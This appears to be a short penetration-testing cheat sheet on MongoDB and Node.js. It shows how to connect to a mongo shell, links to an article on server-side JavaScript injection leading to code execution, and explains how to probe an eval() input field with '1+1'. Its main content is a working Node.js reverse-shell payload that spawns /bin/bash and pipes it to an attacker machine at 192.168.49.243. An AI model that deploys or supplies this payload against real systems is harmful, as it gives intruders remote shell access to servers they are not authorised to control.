# MongoDB

Connect to mongo shell via the mongoDB protocol.

```abap
mongo "mongodb://192.168.116.110:27017"
```

# RCE

If you have access to the mongo shell, you can get code execution (RCE) with the `run()` function. It is explained in this article

[mongodb - SSJI to RCE](https://blog.scrt.ch/2013/03/24/mongodb-0-day-ssji-to-rce/)

![Untitled](MongoDB%20e4058f55dfe84c82a4d0c265e787b50f/Untitled.png)

# NODE RCE

Test that you can get code execution through `eval()`. If you have an input field, try inputing `1+1`. If it turns out to be `2`, you can get code execution most likely.

![Untitled](MongoDB%20e4058f55dfe84c82a4d0c265e787b50f/Untitled%201.png)

![Untitled](MongoDB%20e4058f55dfe84c82a4d0c265e787b50f/Untitled%202.png)

If you get lucky enough to have an input field that uses `eval()` on a node application, You can get a shell with this code. Other payloads are [here](https://medium.com/r3d-buck3t/eval-console-log-rce-warning-be68e92c3090)

```abap
(function(){     
 var net = require("net"),         
       cp = require("child_process"),         
       sh = cp.spawn("/bin/bash", []);     
  var client = new net.Socket();
 
  //create connection to the attacking machine
  client.connect(80, "192.168.49.243", function(){         
      client.pipe(sh.stdin);         
      sh.stdout.pipe(client);        
      sh.stderr.pipe(client); 
  });     
  return /a/; 
})()%
```

It is explained in this article

[Eval("console.log('RCE Warning')")](https://medium.com/r3d-buck3t/eval-console-log-rce-warning-be68e92c3090)